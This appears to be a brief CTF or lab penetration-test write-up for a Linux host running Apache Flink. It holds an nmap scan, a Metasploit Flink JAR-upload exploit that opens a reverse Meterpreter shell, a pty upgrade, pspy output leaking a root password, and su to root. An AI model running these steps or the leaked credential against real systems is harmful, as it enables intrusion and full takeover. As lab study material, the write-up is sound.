
## NMAP
```
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5235c4ed48071617204a8418f62e553e (ECDSA)
|_  256 083d05a173d61fdf262c8538e869c8ce (ED25519)
6123/tcp  open  spark            Apache Spark
8081/tcp  open  blackice-icecap?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: application/json; charset=UTF-8
|     content-length: 74
|     {"errors":["Unable to load requested file /nice ports,/Trinity.txt.bak."]}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Mon, 03 Apr 2023 20:28:30 GMT
|     Expires: Mon, 03 Apr 2023 20:33:30 GMT
|     Cache-Control: private, max-age=300
|     Last-Modified: Mon, 03 Apr 2023 20:28:30 GMT
|     content-length: 2137
|     <!--
|     Licensed to the Apache Software Foundation (ASF) under one
|     more contributor license agreements. See the NOTICE file
|     distributed with this work for additional information
|     regarding copyright ownership. The ASF licenses this file
|     under the Apache License, Version 2.0 (the
|     "License"); you may not use this file except in compliance
|     with the License. You may obtain a copy of the License at
|     http://www.apache.org/licenses/LICENSE-2.0
|     Unless required by applicable law or agreed to in writing, software
|     distributed under the License is distributed on an "AS IS" BASIS,
|     WITHOUT WARRANTIES OR CONDITIONS OF
|   SIPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Type: application/json; charset=UTF-8
|     Access-Control-Allow-Origin: *
|     Connection: keep-alive
|     content-length: 25
|     {"errors":["Not found."]}
|   WWWOFFLEctrlstat: 
|     HTTP/1.1 404 Not Found
|     Content-Type: application/json; charset=UTF-8
|     content-length: 58
|_    {"errors":["Unable to load requested file /bad-request."]}
32779/tcp open  spark            Apache Spark
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8081-TCP:V=7.93%I=7%D=4/3%Time=642B3715%P=x86_64-pc-linux-gnu%r(Get
SF:Request,93B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDa
SF:te:\x20Mon,\x2003\x20Apr\x202023\x2020:28:30\x20GMT\r\nExpires:\x20Mon,
SF:\x2003\x20Apr\x202023\x2020:33:30\x20GMT\r\nCache-Control:\x20private,\
SF:x20max-age=300\r\nLast-Modified:\x20Mon,\x2003\x20Apr\x202023\x2020:28:
SF:30\x20GMT\r\ncontent-length:\x202137\r\n\r\n<!--\n\x20\x20~\x20Licensed
SF:\x20to\x20the\x20Apache\x20Software\x20Foundation\x20\(ASF\)\x20under\x
SF:20one\n\x20\x20~\x20or\x20more\x20contributor\x20license\x20agreements\
SF:.\x20\x20See\x20the\x20NOTICE\x20file\n\x20\x20~\x20distributed\x20with
SF:\x20this\x20work\x20for\x20additional\x20information\n\x20\x20~\x20rega
SF:rding\x20copyright\x20ownership\.\x20\x20The\x20ASF\x20licenses\x20this
SF:\x20file\n\x20\x20~\x20to\x20you\x20under\x20the\x20Apache\x20License,\
SF:x20Version\x202\.0\x20\(the\n\x20\x20~\x20\"License\"\);\x20you\x20may\
SF:x20not\x20use\x20this\x20file\x20except\x20in\x20compliance\n\x20\x20~\
SF:x20with\x20the\x20License\.\x20\x20You\x20may\x20obtain\x20a\x20copy\x2
SF:0of\x20the\x20License\x20at\n\x20\x20~\n\x20\x20~\x20\x20\x20\x20\x20ht
SF:tp://www\.apache\.org/licenses/LICENSE-2\.0\n\x20\x20~\n\x20\x20~\x20Un
SF:less\x20required\x20by\x20applicable\x20law\x20or\x20agreed\x20to\x20in
SF:\x20writing,\x20software\n\x20\x20~\x20distributed\x20under\x20the\x20L
SF:icense\x20is\x20distributed\x20on\x20an\x20\"AS\x20IS\"\x20BASIS,\n\x20
SF:\x20~\x20WITHOUT\x20WARRANTIES\x20OR\x20CONDITIONS\x20OF")%r(FourOhFour
SF:Request,A7,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20applic
SF:ation/json;\x20charset=UTF-8\r\ncontent-length:\x2074\r\n\r\n{\"errors\
SF:":\[\"Unable\x20to\x20load\x20requested\x20file\x20/nice\x20ports,/Trin
SF:ity\.txt\.bak\.\"\]}")%r(SIPOptions,AE,"HTTP/1\.1\x20404\x20Not\x20Foun
SF:d\r\nContent-Type:\x20application/json;\x20charset=UTF-8\r\nAccess-Cont
SF:rol-Allow-Origin:\x20\*\r\nConnection:\x20keep-alive\r\ncontent-length:
SF:\x2025\r\n\r\n{\"errors\":\[\"Not\x20found\.\"\]}")%r(WWWOFFLEctrlstat,
SF:97,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20application/js
SF:on;\x20charset=UTF-8\r\ncontent-length:\x2058\r\n\r\n{\"errors\":\[\"Un
SF:able\x20to\x20load\x20requested\x20file\x20/bad-request\.\"\]}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.53 seconds
```
## MSFConsole
```
msf6 exploit(multi/http/apache_flink_jar_upload_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Apache Flink version 1.11.0.
[*] Uploading JAR payload 'hwMnTbljdoPp.jar' (5265 bytes) ...
[*] Retrieving list of avialable JAR files ...
[+] Found uploaded JAR file '452afaab-0dc3-4344-b98d-cdb1142616ed_hwMnTbljdoPp.jar'
[*] Executing JAR payload '452afaab-0dc3-4344-b98d-cdb1142616ed_hwMnTbljdoPp.jar' entry class 'metasploit.Payload' ...
[*] Sending stage (58829 bytes) to 10.10.110.78
[*] Meterpreter session 1 opened (10.10.14.21:4444 -> 10.10.110.78:59990) at 2023-04-03 13:34:30 -0700
[*] Removing JAR file '452afaab-0dc3-4344-b98d-cdb1142616ed_hwMnTbljdoPp.jar' ...

meterpreter > 
```
Changed over to a tty shell
```
meterpreter > shell
Process 1 created.
Channel 2 created.
whoami
ipp
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
python3 -c 'import pty; pty.spawn("/bin/bash")'
ipp@WEB03-Hestia:~$ whoami
whoami
ipp
ipp@WEB03-Hestia:~$ id
id
uid=1000(ipp) gid=1000(ipp) groups=1000(ipp)
ipp@WEB03-Hestia:~$ 
```
download and run pspy32

```
pp@WEB03-Hestia:/tmp$ ./pspy32s
```
```
/bin/sh -c python3 /root/script.py -u root -p P455w0rd666! 2>&1 
```
```
meterpreter > shell
Process 3 created.
Channel 11 created.
su -
Password: P455w0rd666!
whoami
root
```


